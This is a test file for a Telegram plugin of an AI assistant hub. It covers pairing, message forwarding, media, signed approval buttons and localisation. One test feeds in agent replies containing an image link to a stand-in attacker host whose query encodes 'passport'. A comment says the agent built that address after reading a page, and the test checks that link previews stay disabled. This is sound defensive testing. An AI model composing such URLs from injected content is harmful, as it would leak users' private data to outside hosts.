import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { join } from "node:path";
import { startPlugin, type PluginHarness } from "@piomio/testkit";
import { startMockTelegram, type MockTelegram } from "./mock-telegram.ts";

const TOKEN = "123456:TEST-token";
const OWNER = 111;
const STRANGER = 222;
const dir = join(import.meta.dirname, "..");

const until = async <T>(fn: () => T | Promise<T>, timeoutMs = 8000): Promise<NonNullable<T>> => {
  const end = Date.now() + timeoutMs;
  for (;;) {
    const v = await fn();
    if (v) return v as NonNullable<T>;
    if (Date.now() > end) throw new Error("condition not met in time");
    await new Promise((r) => setTimeout(r, 25));
  }
};

const privateMsg = (chatId: number, text: string | undefined, extra: Record<string, unknown> = {}) => ({
  message: {
    message_id: Math.floor(Math.random() * 1e6),
    date: Math.floor(Date.now() / 1000),
    chat: { id: chatId, type: "private", first_name: chatId === OWNER ? "Аня" : "Чужой" },
    from: { id: chatId, first_name: chatId === OWNER ? "Аня" : "Чужой" },
    ...(text !== undefined ? { text } : {}),
    ...extra,
  },
});

describe("telegram plugin", () => {
  let tg: MockTelegram;
  let h: PluginHarness;

  beforeAll(async () => {
    tg = await startMockTelegram(TOKEN);
    h = await startPlugin({
      dir,
      settings: { apiBaseUrl: tg.url, pollTimeoutSec: 1, tokenRetrySec: 0.2 },
      vault: { telegram_bot_token: { value: TOKEN } },
      core: (method, p) => {
        switch (method) {
          case "channels.inbound":
            return p.text === "/stop" ? { interrupted: true } : { messageId: "m1", conversationId: "c1" };
          case "approvals.resolve":
            if (p.token === "staleTok") throw new Error("This approval has already been handled (denied)");
            if (p.token === "staleTokRu") throw new Error("Подтверждение уже обработано (denied)");
            if (p.token !== "goodApproveTok1" && p.token !== "goodDenyTok12345") throw new Error("Неверная подпись кнопки");
            return { id: p.id, status: p.decision === "approve" ? "approved" : "denied" };
          case "notifications.feedback":
            if (p.token !== "fbTokLess123") throw new Error("Неверная подпись кнопки");
            return { id: p.id, feedback: p.value };
          case "tasks.list":
            return [
              { id: "t1", title: "Отчёт <Q3>", goal: "", status: "running" },
              { id: "t2", title: "Купить билеты", goal: "", status: "done" },
            ];
          default:
            return {};
        }
      },
    });
  });

  afterAll(async () => {
    await h?.stop();
    await tg?.close();
  });

  it("registers the channel and rejects public HTTP", async () => {
    expect(h.channels.get("telegram")).toBe("Telegram");
    expect((await h.http({ path: "/status", public: true })).status).toBe(404);
  });

  it("pairs with exactly one chat via /start <code>", async () => {
    const st = await until(async () => {
      const r = (await h.http({ path: "/status" })).body as any;
      return r.state === "polling" ? r : undefined;
    });
    expect(st.connected).toBe(false);
    expect(st.pairingCode).toMatch(/^\d{6}$/);
    expect(st.deepLink).toBe(`https://t.me/piomio_test_bot?start=${st.pairingCode}`);
    const wrong = st.pairingCode === "000000" ? "111111" : "000000";

    let from = tg.calls.length;
    tg.push(privateMsg(OWNER, `/start ${wrong}`));
    const bad = await tg.waitFor("sendMessage", (p) => p.chat_id === OWNER, { from });
    expect(bad.params.text).toContain("That code didn't work");

    from = tg.calls.length;
    tg.push(privateMsg(OWNER, `/start ${st.pairingCode}`));
    const hello = await tg.waitFor("sendMessage", (p) => p.chat_id === OWNER, { from });
    expect(hello.params.text).toContain("Hi, Аня!");
    expect(hello.params.parse_mode).toBe("HTML");

    const after = (await h.http({ path: "/status" })).body as any;
    expect(after.connected).toBe(true);
    expect(after.chat.id).toBe(OWNER);
    expect(after.pairingCode).toBeNull();
    expect(after.detail).toBe("@piomio_test_bot is linked to the chat “Аня”");
    expect(h.coreCalls.some((c) => c.method === "ui.emit" && c.params.channel === "status")).toBe(true);
    expect((await h.peer.request<any>("channel.status", { channelId: "telegram" })).connected).toBe(true);
  });

  it("registers the command menu in the hub language", async () => {
    const cmds = await tg.waitFor("setMyCommands");
    expect(cmds.params.commands).toEqual([
      { command: "tasks", description: "tasks in progress and recent ones" },
      { command: "stop", description: "stop the assistant's current work" },
      { command: "help", description: "help" },
    ]);
  });

  it("ignores other chats with one polite reply", async () => {
    const from = tg.calls.length;
    tg.push(privateMsg(STRANGER, "привет"));
    tg.push(privateMsg(STRANGER, "ну ответь"));
    tg.push(privateMsg(STRANGER, `/start 123456`));
    const marker = tg.push(privateMsg(OWNER, "/help"));
    await tg.waitFor("sendMessage", (p) => p.chat_id === OWNER && p.text.includes("/tasks"), { from });
    expect(marker).toBeGreaterThan(0);
    const toStranger = tg.callsOf("sendMessage", (p) => p.chat_id === STRANGER);
    expect(toStranger).toHaveLength(1);
    expect(toStranger[0].params.text).toContain("already linked to another chat");
    expect(h.coreCalls.filter((c) => c.method === "channels.inbound")).toHaveLength(0);
  });

  it("forwards owner text to channels.inbound and shows typing until the reply", async () => {
    const from = tg.calls.length;
    tg.push(privateMsg(OWNER, "Что у меня завтра?"));
    await until(() => h.coreCalls.find((c) => c.method === "channels.inbound" && c.params.text === "Что у меня завтра?"));
    expect(h.coreCalls.find((c) => c.method === "channels.inbound")!.params).toEqual({ channel: "telegram", text: "Что у меня завтра?" });
    const typing = await tg.waitFor("sendChatAction", () => true, { from });
    expect(typing.params).toEqual({ chat_id: OWNER, action: "typing" });

    await h.channelSend("telegram", { kind: "reply", text: "Завтра: **созвон** в 10:00 & обед <с Олей>" });
    const reply = await tg.waitFor("sendMessage", (p) => p.text.includes("созвон"), { from });
    expect(reply.params.text).toBe("Завтра: <b>созвон</b> в 10:00 &amp; обед &lt;с Олей&gt;");
    expect(reply.params.chat_id).toBe(OWNER);
  });

  it("quotes the web message a mirrored reply answers", async () => {
    const from = tg.calls.length;
    await h.channelSend("telegram", { kind: "reply", text: "Кофе в **турке**", quote: "где кофе <в турке>?" });
    const sent = await tg.waitFor("sendMessage", (p) => p.text.includes("турке</b>"), { from });
    expect(sent.params.text).toBe("<blockquote><i>You, in the web app:</i> где кофе &lt;в турке&gt;?</blockquote>\nКофе в <b>турке</b>");
  });

  it("previews only the link the hub cleared, in its own part of a long reply; otherwise none", async () => {
    let from = tg.calls.length;
    // A link the hub did not clear (an address the agent put together after reading a page): no preview.
    await h.channelSend("telegram", { kind: "reply", text: "Готово: ![p](https://pics.attacker.test/p.png?d=cGFzc3BvcnQ) и https://news.example.org/a" });
    const plain = await tg.waitFor("sendMessage", (p) => p.text.includes("Готово"), { from });
    expect(plain.params.link_preview_options).toEqual({ is_disabled: true });

    from = tg.calls.length;
    await h.channelSend("telegram", { kind: "reply", text: "![p](https://pics.attacker.test/p.png?d=cGFzc3BvcnQ) Источник: https://news.example.org/a", preview: "https://news.example.org/a" });
    const cleared = await tg.waitFor("sendMessage", (p) => p.text.includes("Источник"), { from });
    // Pinned to that link: Telegram's servers fetch nothing else of the message.
    expect(cleared.params.link_preview_options).toEqual({ url: "https://news.example.org/a" });

    from = tg.calls.length;
    const long = Array.from({ length: 300 }, (_, i) => `Строка ${i} без ссылок.`).join("\n");
    await h.channelSend("telegram", { kind: "reply", text: `https://pics.attacker.test/x?d=1\n${long}\nПодробнее: https://news.example.org/b`, preview: "https://news.example.org/b" });
    await tg.waitFor("sendMessage", (p) => p.text.includes("Подробнее"), { from });
    const parts = tg.calls.slice(from).filter((c) => c.method === "sendMessage");
    expect(parts.length).toBeGreaterThan(1);
    expect(parts.map((c) => c.params.link_preview_options)).toEqual([...parts.slice(1).map(() => ({ is_disabled: true })), { url: "https://news.example.org/b" }]);
  });

  it("handles /stop, /tasks and non-text messages", async () => {
    let from = tg.calls.length;
    tg.push(privateMsg(OWNER, "/stop"));
    const stopped = await tg.waitFor("sendMessage", (p) => p.chat_id === OWNER, { from });
    expect(stopped.params.text).toContain("Stopped the current work");
    expect(h.coreCalls.some((c) => c.method === "channels.inbound" && c.params.text === "/stop")).toBe(true);

    from = tg.calls.length;
    tg.push(privateMsg(OWNER, "/tasks"));
    const tasks = await tg.waitFor("sendMessage", (p) => p.chat_id === OWNER, { from });
    expect(tasks.params.text).toBe("<b>In progress</b>\n• Отчёт &lt;Q3&gt; — <i>running</i>\n\n<b>Recently finished</b>\n• Купить билеты — <i>done</i>");

    from = tg.calls.length;
    tg.push(privateMsg(OWNER, undefined, { sticker: { file_id: "st", width: 1, height: 1 } }));
    const sticker = await tg.waitFor("sendMessage", (p) => p.chat_id === OWNER, { from });
    expect(sticker.params.text).toContain("I can read text, photos, files, voice messages and places");
  });

  const inbound = (pred: (p: any) => boolean) => until(() => h.coreCalls.find((c) => c.method === "channels.inbound" && pred(c.params))?.params);
  const b64 = (s: string) => Buffer.from(s).toString("base64");

  it("passes a photo with its caption, in its largest size", async () => {
    tg.addFile("ph-big", new TextEncoder().encode("big jpeg"), { path: "photos/file_1.jpg" });
    tg.push(privateMsg(OWNER, undefined, { caption: "чек за обед", photo: [{ file_id: "ph-small", width: 90, height: 90, file_size: 10 }, { file_id: "ph-big", width: 1280, height: 960, file_size: 8 }] }));
    expect(await inbound((p) => p.text === "чек за обед")).toEqual({
      channel: "telegram",
      text: "чек за обед",
      files: [{ mimeType: "image/jpeg", data: b64("big jpeg"), kind: "photo" }],
    });
  });

  it("collects an album into one message", async () => {
    for (const id of ["al1", "al2", "al3"]) tg.addFile(id, new TextEncoder().encode(id), { path: `photos/${id}.jpg` });
    const album = (id: string, n: number, caption?: string) =>
      privateMsg(OWNER, undefined, { message_id: 900 + n, media_group_id: "album-1", photo: [{ file_id: id, width: 10, height: 10 }], ...(caption ? { caption } : {}) });
    tg.push(album("al1", 1, "отпуск"));
    tg.push(album("al2", 2));
    tg.push(album("al3", 3));
    const p = await inbound((x) => x.text === "отпуск");
    expect(p.files.map((f: any) => f.data)).toEqual([b64("al1"), b64("al2"), b64("al3")]);
    await new Promise((r) => setTimeout(r, 1700));
    expect(h.coreCalls.filter((c) => c.method === "channels.inbound" && c.params.files?.some((f: any) => f.data === b64("al2")))).toHaveLength(1);
  });

  it("passes a voice message with its length, a document with its name", async () => {
    tg.addFile("vo1", new TextEncoder().encode("OggS"), { path: "voice/file_7.oga" });
    tg.push(privateMsg(OWNER, undefined, { voice: { file_id: "vo1", duration: 12, mime_type: "audio/ogg", file_size: 4 } }));
    expect((await inbound((p) => p.files?.[0]?.kind === "voice")).files).toEqual([{ mimeType: "audio/ogg", data: b64("OggS"), kind: "voice", durationSec: 12 }]);
    tg.addFile("doc1", new TextEncoder().encode("%PDF"), { path: "documents/file_8.pdf" });
    tg.push(privateMsg(OWNER, undefined, { document: { file_id: "doc1", file_name: "договор.pdf", mime_type: "application/pdf", file_size: 4 } }));
    expect((await inbound((p) => p.files?.[0]?.name === "договор.pdf")).files[0]).toEqual({ name: "договор.pdf", mimeType: "application/pdf", data: b64("%PDF"), kind: "file" });
  });

  it("refuses files over 20 MB and says why", async () => {
    const from = tg.calls.length;
    const before = h.coreCalls.length;
    tg.addFile("huge", new Uint8Array(1), { size: 25 * 1024 * 1024 });
    tg.push(privateMsg(OWNER, undefined, { document: { file_id: "huge", file_name: "фильм.mkv", file_size: 25 * 1024 * 1024 } }));
    const said = await tg.waitFor("sendMessage", (p) => p.chat_id === OWNER && p.text.includes("over 20 MB"), { from });
    expect(said.params.text).toContain("фильм.mkv is over 20 MB");
    // Telegram's own size was unknown: the download says it is too big.
    tg.addFile("huge2", new Uint8Array(1), { size: 21 * 1024 * 1024 });
    tg.push(privateMsg(OWNER, undefined, { document: { file_id: "huge2", file_name: "архив.zip" } }));
    await tg.waitFor("sendMessage", (p) => p.text.includes("архив.zip is over 20 MB"), { from });
    expect(h.coreCalls.slice(before).filter((c) => c.method === "channels.inbound")).toHaveLength(0);
  });

  it("passes a place as a pin, and tells the model about forwards and replies", async () => {
    tg.push(privateMsg(OWNER, undefined, { location: { latitude: 43.238949, longitude: 76.889709 } }));
    expect(await inbound((p) => p.text?.startsWith("📍"))).toEqual({ channel: "telegram", text: "📍 (43.23895, 76.88971)" });
    tg.push(
      privateMsg(OWNER, "что думаешь?", {
        forward_origin: { type: "user", sender_user: { id: 9, first_name: "Оля" } },
        reply_to_message: { message_id: 5, date: 0, chat: { id: OWNER, type: "private" }, from: { id: 4242, is_bot: true, first_name: "Piomio" }, text: "Напомнить про созвон?" },
      }),
    );
    expect(await inbound((p) => p.text === "что думаешь?")).toEqual({
      channel: "telegram",
      text: "что думаешь?",
      context: '[Forwarded from Оля]\n[In reply to your message: "Напомнить про созвон?"]',
    });
  });

  it("splits long messages and respects silent", async () => {
    const from = tg.calls.length;
    const long = Array.from({ length: 400 }, (_, i) => `Строка номер ${i} с текстом & символами.`).join("\n");
    await h.channelSend("telegram", { kind: "notification", text: `Длинная сводка\n\n${long}`, silent: true });
    const sends = tg.calls.slice(from).filter((c) => c.method === "sendMessage");
    expect(sends.length).toBeGreaterThan(3);
    for (const s of sends) {
      expect(s.params.text.replace(/<[^>]+>/g, "").replace(/&amp;/g, "&").length).toBeLessThanOrEqual(4096);
      expect(s.params.disable_notification).toBe(true);
    }
    expect(sends[0].params.text.startsWith("<b>Длинная сводка</b>")).toBe(true);
    const all = sends.map((s) => s.params.text).join("\n");
    expect(all).toContain("Строка номер 0 ");
    expect(all).toContain("Строка номер 399 ");
  });

  it("sends approval cards and resolves them with signed buttons", async () => {
    let from = tg.calls.length;
    await h.channelSend("telegram", {
      kind: "approval",
      text: "🔐 Ассистент просит подтвердить:\nОтправить письмо boss@example.com",
      link: "http://127.0.0.1:8081/#/approvals/a1",
      approval: { id: "akz9x1", summary: "Отправить письмо", approveToken: "goodApproveTok1", denyToken: "goodDenyTok12345" },
    });
    const card = await tg.waitFor("sendMessage", (p) => !!p.reply_markup, { from });
    const kb = card.params.reply_markup.inline_keyboard;
    expect(kb).toHaveLength(1); // no URL button for a non-https console link
    expect(kb[0].map((b: any) => b.callback_data)).toEqual(["a:akz9x1:a:goodApproveTok1", "a:akz9x1:d:goodDenyTok12345"]);
    expect(kb[0].map((b: any) => b.text)).toEqual(["✅ Approve", "❌ Deny"]);
    expect(card.params.text).toContain("http://127.0.0.1:8081/#/approvals/a1");

    from = tg.calls.length;
    tg.push({
      callback_query: {
        id: "cb1",
        from: { id: OWNER },
        data: "a:akz9x1:a:goodApproveTok1",
        message: { message_id: 77, chat: { id: OWNER, type: "private" }, text: "Отправить письмо", entities: [], reply_markup: card.params.reply_markup },
      },
    });
    const edit = await tg.waitFor("editMessageText", () => true, { from });
    expect(edit.params.text).toContain("✅ Approved");
    expect(edit.params.reply_markup).toEqual({ inline_keyboard: [] });
    expect(h.coreCalls.find((c) => c.method === "approvals.resolve")!.params).toEqual({ id: "akz9x1", decision: "approve", token: "goodApproveTok1" });
    const ans = tg.callsOf("answerCallbackQuery", (p) => p.callback_query_id === "cb1");
    expect(ans[0].params.text).toBe("✅ Approved");
  });

  it("reports invalid or expired approval buttons", async () => {
    const from = tg.calls.length;
    tg.push({
      callback_query: {
        id: "cb2",
        from: { id: OWNER },
        data: "a:akz9x1:d:forgedTok",
        message: { message_id: 78, chat: { id: OWNER, type: "private" }, text: "Удалить файл" },
      },
    });
    const ans = await tg.waitFor("answerCallbackQuery", (p) => p.callback_query_id === "cb2", { from });
    expect(ans.params.show_alert).toBe(true);
    expect(ans.params.text).toBe("That didn't work: Неверная подпись кнопки");
    const edit = await tg.waitFor("editMessageText", (p) => p.message_id === 78, { from });
    expect(edit.params.text).toContain("⚠️");
  });

  it("shows the real outcome when the approval was already answered elsewhere", async () => {
    // The hub reports it in English ("staleTok") or, in older versions, in Russian ("staleTokRu").
    for (const [i, token] of ["staleTok", "staleTokRu"].entries()) {
      const from = tg.calls.length;
      const id = `cb2b${i}`;
      tg.push({
        callback_query: {
          id,
          from: { id: OWNER },
          data: `a:akz9x2:a:${token}`,
          message: { message_id: 79 + i * 100, chat: { id: OWNER, type: "private" }, text: "Оплатить счёт" },
        },
      });
      const edit = await tg.waitFor("editMessageText", (p) => p.message_id === 79 + i * 100, { from });
      expect(edit.params.text).toBe("Оплатить счёт\n\n<b>❌ Denied</b>");
      const ans = tg.callsOf("answerCallbackQuery", (p) => p.callback_query_id === id);
      expect(ans[0].params.text).toBe("Already handled: ❌ Denied");
      expect(ans[0].params.show_alert).toBeUndefined();
    }
  });

  it("ignores button presses from other chats", async () => {
    const before = h.coreCalls.filter((c) => c.method === "approvals.resolve").length;
    const from = tg.calls.length;
    tg.push({
      callback_query: {
        id: "cb3",
        from: { id: STRANGER },
        data: "a:akz9x1:a:goodApproveTok1",
        message: { message_id: 5, chat: { id: STRANGER, type: "private" }, text: "x" },
      },
    });
    const ans = await tg.waitFor("answerCallbackQuery", (p) => p.callback_query_id === "cb3", { from });
    expect(ans.params.text).toBe("This button is not available.");
    expect(h.coreCalls.filter((c) => c.method === "approvals.resolve").length).toBe(before);
  });

  it("sends notification feedback buttons and applies the feedback", async () => {
    let from = tg.calls.length;
    await h.channelSend("telegram", {
      kind: "notification",
      text: "Цена упала\n\nБилет в Казань теперь 3 200 ₽",
      link: "https://bot.example.com/tasks/t9",
      notificationId: "n_abc",
      feedback: { notificationId: "n_abc", tokens: { useful: "fbTokUseful1", less: "fbTokLess123", off: "fbTokOff1234" } },
    });
    const msg = await tg.waitFor("sendMessage", (p) => !!p.reply_markup, { from });
    const kb = msg.params.reply_markup.inline_keyboard;
    expect(kb[0].map((b: any) => b.callback_data)).toEqual(["f:n_abc:u:fbTokUseful1", "f:n_abc:l:fbTokLess123", "f:n_abc:o:fbTokOff1234"]);
    expect(kb[1]).toEqual([{ text: "Open", url: "https://bot.example.com/tasks/t9" }]);
    for (const row of kb) for (const b of row) if (b.callback_data) expect(Buffer.byteLength(b.callback_data)).toBeLessThanOrEqual(64);

    from = tg.calls.length;
    tg.push({
      callback_query: {
        id: "cb4",
        from: { id: OWNER },
        data: "f:n_abc:l:fbTokLess123",
        message: { message_id: 90, chat: { id: OWNER, type: "private" }, text: "Цена упала\n\nБилет", entities: [{ type: "bold", offset: 0, length: 10 }], reply_markup: msg.params.reply_markup },
      },
    });
    const edit = await tg.waitFor("editMessageText", (p) => p.message_id === 90, { from });
    expect(edit.params.text).toContain("<b>Цена упала</b>");
    expect(edit.params.text).toContain("I'll write less often");
    expect(edit.params.reply_markup.inline_keyboard).toEqual([[{ text: "Open", url: "https://bot.example.com/tasks/t9" }]]);
    expect(h.coreCalls.find((c) => c.method === "notifications.feedback")!.params).toEqual({ id: "n_abc", value: "less", token: "fbTokLess123" });
  });

  it("falls back to plain text when Telegram rejects the HTML", async () => {
    const from = tg.calls.length;
    tg.failNext("sendMessage", 400, "Bad Request: can't parse entities: unexpected end tag");
    await h.channelSend("telegram", { kind: "reply", text: "**a *b** c*" });
    const plain = await tg.waitFor("sendMessage", (p) => p.parse_mode === undefined, { from });
    expect(plain.params.text).not.toContain("<");
  });

  it("sends pictures as photos and albums, uploads workspace files and pins maps", async () => {
    let from = tg.calls.length;
    await h.channelSend("telegram", { kind: "reply", text: "Вот он", media: [{ kind: "image", url: "https://img.example.com/a.jpg", caption: "Собор" }] });
    const photo = await tg.waitFor("sendPhoto", () => true, { from });
    expect(photo.params).toMatchObject({ chat_id: OWNER, photo: "https://img.example.com/a.jpg", caption: "Собор" });
    // The text first, then the picture.
    const order = tg.calls.slice(from).map((c) => c.method);
    expect(order.indexOf("sendMessage")).toBeLessThan(order.indexOf("sendPhoto"));

    from = tg.calls.length;
    const png = Buffer.from("\x89PNG fake").toString("base64");
    await h.channelSend("telegram", {
      kind: "reply",
      text: "",
      media: [
        { kind: "image", url: "https://img.example.com/b.jpg", caption: "Мост" },
        { kind: "image", data: png, mimeType: "image/png", name: "chart.png", caption: "График" },
        { kind: "image", data: Buffer.from("<svg/>").toString("base64"), mimeType: "image/svg+xml", name: "logo.svg" },
        { kind: "map", lat: 55.75, lon: 37.62, title: "Красная площадь" },
      ],
    });
    const album = await tg.waitFor("sendMediaGroup", () => true, { from });
    expect(album.params.chat_id).toBe(String(OWNER));
    expect(album.params.media).toEqual([
      { type: "photo", media: "https://img.example.com/b.jpg", caption: "1. Мост\n2. График" },
      { type: "photo", media: "attach://f1" },
    ]);
    expect(album.params.f1).toMatchObject({ file: true, name: "chart.png", type: "image/png", size: Buffer.from(png, "base64").length });
    // SVG is no photo for Telegram: it goes as a document.
    const doc = await tg.waitFor("sendDocument", () => true, { from });
    expect(doc.params.document).toMatchObject({ file: true, name: "logo.svg", type: "image/svg+xml" });
    const pin = await tg.waitFor("sendLocation", () => true, { from });
    expect(pin.params).toMatchObject({ chat_id: OWNER, latitude: 55.75, longitude: 37.62 });
    const title = await tg.waitFor("sendMessage", (p) => p.text.includes("Красная площадь"), { from });
    expect(title.params.text).toBe("<b>Красная площадь</b>");
    // No empty "…" message before pictures without words.
    expect(tg.calls.slice(from).filter((c) => c.method === "sendMessage").map((c) => c.params.text)).toEqual(["<b>Красная площадь</b>"]);
  });

  it("sends links instead when Telegram refuses a picture or a pin", async () => {
    let from = tg.calls.length;
    tg.failNext("sendPhoto", 400, "Bad Request: wrong file identifier/HTTP URL specified");
    await h.channelSend("telegram", { kind: "reply", text: "", media: [{ kind: "image", url: "https://img.example.com/x.jpg?a=1&b=2", caption: "Кот" }] });
    const links = await tg.waitFor("sendMessage", (p) => p.text.includes("Couldn't send the pictures"), { from });
    expect(links.params.text).toContain('• <a href="https://img.example.com/x.jpg?a=1&amp;b=2">Кот</a>');

    from = tg.calls.length;
    tg.failNext("sendLocation", 400, "Bad Request: wrong latitude");
    await h.channelSend("telegram", { kind: "reply", text: "", media: [{ kind: "map", lat: 48.8584, lon: 2.2945 }] });
    const osm = await tg.waitFor("sendMessage", (p) => p.text.includes("openstreetmap.org"), { from });
    expect(osm.params.text).toBe("<b>Location</b>\nhttps://www.openstreetmap.org/?mlat=48.8584&amp;mlon=2.2945#map=16/48.8584/2.2945");
  });

  it("unbinds and issues a new pairing code", async () => {
    const r = (await h.http({ method: "POST", path: "/unbind" })).body as any;
    expect(r.chat).toBeNull();
    expect(r.connected).toBe(false);
    expect(r.pairingCode).toMatch(/^\d{6}$/);
    const regen = (await h.http({ method: "POST", path: "/pairing-code" })).body as any;
    expect(regen.pairingCode).toMatch(/^\d{6}$/);
    // Unbound: outbound messages are dropped quietly.
    const from = tg.calls.length;
    await h.channelSend("telegram", { kind: "reply", text: "nobody" });
    expect(tg.calls.slice(from).filter((c) => c.method === "sendMessage" && c.params.text === "nobody")).toHaveLength(0);
  });
});

describe("telegram plugin without a token", () => {
  it("reports the missing token, waits for it without polling the vault and connects once it is stored", async () => {
    const tg = await startMockTelegram(TOKEN);
    const h = await startPlugin({ dir, settings: { apiBaseUrl: tg.url, pollTimeoutSec: 1, tokenRetrySec: 0.05 } });
    try {
      const st = await until(async () => {
        const s = (await h.http({ path: "/status" })).body as any;
        return s.state === "no-token" ? s : undefined;
      });
      expect(st.connected).toBe(false);
      // The hub's "no such item" (the harness answers like it): the setup card asks for the token, no raw error.
      expect(st.detail).toBe("No bot token");
      const ch = await h.peer.request<any>("channel.status", { channelId: "telegram" });
      expect(ch.connected).toBe(false);
      // A retry every 50 ms would have asked the hub a dozen times by now (each one a vault.denied in the audit log).
      await new Promise((r) => setTimeout(r, 600));
      expect(h.vaultGets.filter((id) => id === "telegram_bot_token").length).toBeLessThanOrEqual(2);
      expect(h.subscriptions.has("vault.updated")).toBe(true);
      expect(h.logs.join("\n")).not.toContain("uncaught");
      // Storing the token (chat or security console) wakes it at once.
      h.setVault("telegram_bot_token", { value: TOKEN });
      const live = await until(async () => {
        const s = (await h.http({ path: "/status" })).body as any;
        return s.state === "polling" ? s : undefined;
      }, 5000);
      expect(live.deepLink).toMatch(/^https:\/\/t\.me\/piomio_test_bot\?start=\d{6}$/);
    } finally {
      await h.stop();
      await tg.close();
    }
  });
});

describe("telegram plugin with Telegram's long polls", () => {
  it("is connected (and shows the pairing link) as soon as the token works, not after the first empty poll", async () => {
    const tg = await startMockTelegram(TOKEN, { maxPollSec: 30 });
    const h = await startPlugin({ dir, settings: { apiBaseUrl: tg.url, pollTimeoutSec: 30 }, vault: { telegram_bot_token: { value: TOKEN } } });
    try {
      await tg.waitFor("getUpdates");
      // The first getUpdates now holds for 30 s; the card must not say "Connecting…" meanwhile.
      const st = await until(async () => {
        const s = (await h.http({ path: "/status" })).body as any;
        return s.state === "polling" ? s : undefined;
      }, 1500);
      expect(st.deepLink).toMatch(/^https:\/\/t\.me\/piomio_test_bot\?start=\d{6}$/);
    } finally {
      await h.stop();
      await tg.close();
    }
  });
});

describe("telegram plugin in Russian", () => {
  it("writes to the chat, describes commands and reports status in the hub language", async () => {
    const tg = await startMockTelegram(TOKEN);
    const h = await startPlugin({
      dir,
      locale: "ru",
      settings: { apiBaseUrl: tg.url, pollTimeoutSec: 1, tokenRetrySec: 0.2 },
      vault: { telegram_bot_token: { value: TOKEN } },
    });
    try {
      const cmds = await tg.waitFor("setMyCommands");
      expect(cmds.params.commands).toContainEqual({ command: "tasks", description: "задачи в работе и недавние" });
      const st = await until(async () => {
        const r = (await h.http({ path: "/status" })).body as any;
        return r.state === "polling" ? r : undefined;
      });
      expect(st.detail).toBe(`@piomio_test_bot ждёт привязки: отправьте ему /start ${st.pairingCode}`);

      let from = tg.calls.length;
      tg.push(privateMsg(OWNER, `/start ${st.pairingCode === "000000" ? "111111" : "000000"}`));
      const bad = await tg.waitFor("sendMessage", (p) => p.chat_id === OWNER, { from });
      expect(bad.params.text).toBe("Код не подошёл. Проверьте код в настройках Piomio и попробуйте ещё раз.");

      // Switching the hub language re-registers the command menu.
      from = tg.calls.length;
      h.setLocale("en");
      const en = await tg.waitFor("setMyCommands", () => true, { from });
      expect(en.params.commands).toContainEqual({ command: "tasks", description: "tasks in progress and recent ones" });
    } finally {
      await h.stop();
      await tg.close();
    }
  });
});
